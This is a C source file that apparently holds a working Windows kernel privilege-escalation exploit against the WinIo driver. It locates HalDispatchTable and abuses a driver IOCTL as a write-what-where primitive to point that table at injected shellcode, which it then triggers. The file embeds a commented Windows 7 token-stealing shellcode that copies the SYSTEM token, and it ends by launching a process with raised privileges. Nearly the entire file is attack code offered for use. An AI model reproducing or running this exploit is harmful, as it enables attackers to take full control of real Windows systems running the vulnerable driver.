#include<Windows.h>
#include<stdio.h>


#define DHAHELPER_IOCTL_INDEX 0x810
#define FILE_DEVICE_DHAHELPER 0x00008011

#define IOCTL_DHAHELPER_MAPPHYSTOLIN     CTL_CODE(FILE_DEVICE_DHAHELPER,     \
                                                  DHAHELPER_IOCTL_INDEX,     \
                                                  METHOD_BUFFERED,           \
                                                  FILE_ANY_ACCESS)

typedef struct dhahelper_t
{
  unsigned int size;
  void* base;
  void* ptr;
};





#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#if !defined(STATUS_SUCCESS)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemPathInformation,
    SystemProcessInformation,
    SystemCallCountInformation,
    SystemDeviceInformation,
    SystemProcessorPerformanceInformation,
    SystemFlagsInformation,
    SystemCallTimeInformation,
    SystemModuleInformation
} SYSTEM_INFORMATION_CLASS,
*PSYSTEM_INFORMATION_CLASS;

typedef struct
{
    ULONG Reserved1;
    ULONG Reserved2;
    PVOID ImageBaseAddress;
    ULONG ImageSize;
    ULONG Flags;
    WORD Id;
    WORD Rank;
    WORD w018;
    WORD NameOffset;
    BYTE Name[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

#pragma warning(disable:4200)
typedef struct
{
    ULONG ModulesCount;
    SYSTEM_MODULE Modules[0];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;




 typedef NTSTATUS (WINAPI *ZQSSI)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

 ZQSSI ZwQuerySystemInformation;
PSYSTEM_MODULE GetKernelInformation()
{
    PSYSTEM_MODULE_INFORMATION pModuleList = NULL;
    PSYSTEM_MODULE pKernInfo = NULL;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG neededSize = 0;


	ZwQuerySystemInformation = (ZQSSI) GetProcAddress(GetModuleHandleA("NTDLL.dll"),"ZwQuerySystemInformation");

	ZwQuerySystemInformation(
        SystemModuleInformation,
        &neededSize,
        0,
        &neededSize
    );

    pModuleList = (PSYSTEM_MODULE_INFORMATION)malloc(neededSize);
    if(pModuleList == NULL)
    {
        printf("Error with malloc().\n");
        return NULL;
    }

    status = ZwQuerySystemInformation(SystemModuleInformation,
        pModuleList,
        neededSize,
        0
    );

    if(!NT_SUCCESS(status))
    {
        printf("Error with ZwQuerySystemInformation().\n");
        free(pModuleList);
        return NULL;
    }

    pKernInfo = (PSYSTEM_MODULE)malloc(sizeof(SYSTEM_MODULE));
    if(pKernInfo == NULL)
    {
        printf("Error with malloc().\n");
        free(pModuleList);
        return NULL;
    }

    memcpy(pKernInfo, pModuleList->Modules, sizeof(SYSTEM_MODULE));
    free(pModuleList);

    return pKernInfo;
}

DWORD GetKernelBase()
{
    PSYSTEM_MODULE pKernInfo = NULL;
    DWORD kernBase = 0;

    pKernInfo = GetKernelInformation();
    if(pKernInfo == NULL)
    {
        printf("Error with GetKernelInformation().\n");
        return 0;
    }

    kernBase = (DWORD)pKernInfo->ImageBaseAddress;
    free(pKernInfo);

    return kernBase;
}

PCHAR GetKernelPath()
{
    PSYSTEM_MODULE pKernInfo = NULL;
    PCHAR kernPath = NULL;
    DWORD size = 0;

    pKernInfo = GetKernelInformation();
    if(pKernInfo == NULL)
    {
        printf("Error with GetKernelInformation().\n");
        return 0;
    }

    size = sizeof(char) * (strlen((const char*)pKernInfo->Name) + 1);
    kernPath = (PCHAR)malloc(size);
    if(kernPath == NULL)
    {
        free(pKernInfo);
        printf("Error with malloc().\n");
        return NULL;
    }

    ZeroMemory(kernPath, size);
    memcpy(kernPath, pKernInfo->Name, size - sizeof(char));
    free(pKernInfo);

    return kernPath;
}

DWORD GetHalQuerySystemInformation()
{
    HMODULE hKern = 0;
    PCHAR pKernPath = NULL, pKern = NULL;
    DWORD HalDispatchTable = 0, kernBase = 0;

    kernBase = GetKernelBase();
    printf("[+] Kernel Base Address: %#.8X\n", kernBase);
    if(kernBase == 0)
    {
        printf("[!] Error with GetKernelBase().\n");
        goto clean;
    }

    pKernPath = GetKernelPath();
    if(pKernPath == NULL)
    {
        printf("[!] Error with GetKernelPath().\n");
        goto clean;
    }

    printf("[+] Kernel Path: '%s'\n", pKernPath);
    pKern = strrchr(pKernPath, '\\') + 1;

    printf("[+] Kernel: '%s'\n", pKern);
    hKern = LoadLibraryExA(pKern, NULL, DONT_RESOLVE_DLL_REFERENCES);

    printf("[+] Kernel Base Address (in this process context): %#.8X\n", hKern);
    HalDispatchTable = (DWORD)GetProcAddress(hKern, "HalDispatchTable");
    printf("[+] HalDispatchTable Address: 0x%.8X\n", HalDispatchTable);
    if(HalDispatchTable == 0)
    {
        printf("[!] Error with GetProcAddress().\n");
        goto clean;
    }



    HalDispatchTable -= (DWORD)hKern;
    HalDispatchTable += kernBase;

    printf("[+] HalDispatchTable Address (after normalization): %#.8X\n");

    clean:
    if(pKernPath != NULL)
        free(pKernPath);

    if(hKern != NULL)
        FreeLibrary(hKern);

    return HalDispatchTable + sizeof(DWORD);
}


/*
1) stack ovrflow 
2) write what we whant in return address 
3) what in where with stack overflow 

*/
typedef struct dhahelper_t dhahelper_t;

typedef enum _KPROFILE_SOURCE {
    ProfileTime
    /* ... */
} KPROFILE_SOURCE, *PKPROFILE_SOURCE;

typedef NTSTATUS (NTAPI *NQi)(
    KPROFILE_SOURCE ProfileSource,
    PULONG Interval
);
NQi NtQueryIntervalProfile;


VOID SetExecutionOnCore0()
{
    DWORD_PTR mask = 1;

    /* Le trick du KdVersionBlock fonctionne que sur le core0, (les autres core n'ont pas l'info dans le KPCR !#@) */
    SetProcessAffinityMask(
        GetCurrentProcess(),
        mask
    );
}


void main()
{
  HANDLE hDriver ;
  PVOID inBuf[1] ;		 
  DWORD cbBytesReturned ;
  DWORD dwBytesReturned;
  dhahelper_t  st={0};
  
  int stack[10];
 
  for(int i=0; i<10;i++)
	  stack[i]=i+1;



  void* shellcodeAddress=VirtualAlloc((int*)NULL,100,MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);

  if(shellcodeAddress==NULL)
	  return ;
   static BYTE escalade_privileges_ring0_win7[] = "\xcc\xcc\x60\x66\xbb\x24\x01\x64\x67\x8b\x07\x8b\x40\x50\x89\xc5\x31\xc9\xb1\xb8\x66\x01\xc8\x8b\x10\x89"
    "\xd0\x83\x7a\xfc\x04\x74\x02\xeb\xf4\x80\xea\xb8\x80\xc2\xf8\x8b\x32\x31\xd2\xb2\xf8\x89\x34\x2a\x61\xc3";


#define Seven_KPROCESS 0x50      // Offset to _KPROCESS from a _ETHREAD struct
#define Seven_TOKEN    0xf8      // Offset to TOKEN from the _EPROCESS struct
#define Seven_UPID     0xb4      // Offset to UniqueProcessId FROM the _EPROCESS struct
#define Seven_APLINKS  0xb8      // Offset to ActiveProcessLinks _EPROCESS struct

   BYTE token_steal_seven[] =
{
  0x52,                                                  // push edx                       Save edx on the stack
  0x53,	                                                 // push ebx                       Save ebx on the stack
  0x33,0xc0,                                             // xor eax, eax                   eax = 0
  0x64,0x8b,0x80,0x24,0x01,0x00,0x00,                    // mov eax, fs:[eax+124h]         Retrieve ETHREAD
  0x8b,0x40,Seven_KPROCESS,                                 // mov eax, [eax+XP_KPROCESS]     Retrieve _KPROCESS
  0x8b,0xc8,                                             // mov ecx, eax
  0x8b,0x98,Seven_TOKEN,0x00,0x00,0x00,                     // mov ebx, [eax+XP_TOKEN]        Retrieves TOKEN
  0x8b,0x80,Seven_APLINKS,0x00,0x00,0x00,                   // mov eax, [eax+XP_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
  0x81,0xe8,Seven_APLINKS,0x00,0x00,0x00,                   // sub eax, XP_APLINKS         |  Retrieve _EPROCESS Pointer from the ActiveProcessLinks
  0x81,0xb8,Seven_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00,  // cmp [eax+XP_UPID], 4        |  Compares UniqueProcessId with 4 (System Process)
  0x75,0xe8,                                             // jne                     ---- 
  0x8b,0x90,Seven_TOKEN,0x00,0x00,0x00,                     // mov edx, [eax+XP_TOKEN]        Retrieves TOKEN and stores on EDX
  0x8b,0xc1,                                             // mov eax, ecx                   Retrieves KPROCESS stored on ECX
  0x89,0x90,Seven_TOKEN,0x00,0x00,0x00,                     // mov [eax+XP_TOKEN], edx        Overwrites the TOKEN for the current KPROCESS
  0x5b,                                                  // pop ebx                        Restores ebx
  0x5a,                                                  // pop edx                        Restores edx
  0xc2,0x08                                              // ret 8                          Away from the kernel    
};


   memcpy(shellcodeAddress,token_steal_seven,sizeof(token_steal_seven));


  st.ptr=GetModuleHandle(NULL);
  st.size=0;
  printf("currnet prcoess address %x\r\n",GetModuleHandle(NULL));
 
  
  printf("shellcode is %x ",shellcodeAddress);
  getchar();

  char ShellcodeFakeMemory[28]={0};
  memcpy(ShellcodeFakeMemory,&st,sizeof(dhahelper_t));


  int* WhereToWrite=(int*)GetHalQuerySystemInformation();
  int* targetpointerinputbuffer=(int*)0x4;
  int* WhatToWrite=(int*)shellcodeAddress;
  
  memcpy(ShellcodeFakeMemory,&WhatToWrite,sizeof(int*));//target pointer
  memcpy(ShellcodeFakeMemory+20,&targetpointerinputbuffer,sizeof(int*));//input buffer len 
  memcpy(ShellcodeFakeMemory+24,&WhereToWrite,sizeof(int*));//fack buffer 

  hDriver = CreateFileA("\\\\.\\WinIo",GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
  if(hDriver!=INVALID_HANDLE_VALUE)
  {
	  if (!DeviceIoControl(hDriver, IOCTL_DHAHELPER_MAPPHYSTOLIN, &ShellcodeFakeMemory,sizeof(ShellcodeFakeMemory),NULL,NULL,&dwBytesReturned, NULL))
	  {
		  fprintf(stderr,"Unable to map the requested memory region.\n");
		  return;
	  }


	
	DWORD byte = 0, osef = 0, HalQuerySystemInformation = 0;
	
	printf("All right, it's time to execute a shell..\n..with more privileges actually !\n");

	getchar();

	SetExecutionOnCore0();

	NtQueryIntervalProfile = (NQi) GetProcAddress(GetModuleHandleA("NTDLL.dll"),"NtQueryIntervalProfile");
	  NtQueryIntervalProfile((KPROFILE_SOURCE)2, &osef);

    STARTUPINFO si = {0};
	 PROCESS_INFORMATION pi = {0};
	si.cb = sizeof(si);
	
   

	CreateProcess(
        NULL,
        "explorer.exe",
        NULL,
        NULL,
        TRUE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    );

  }
}

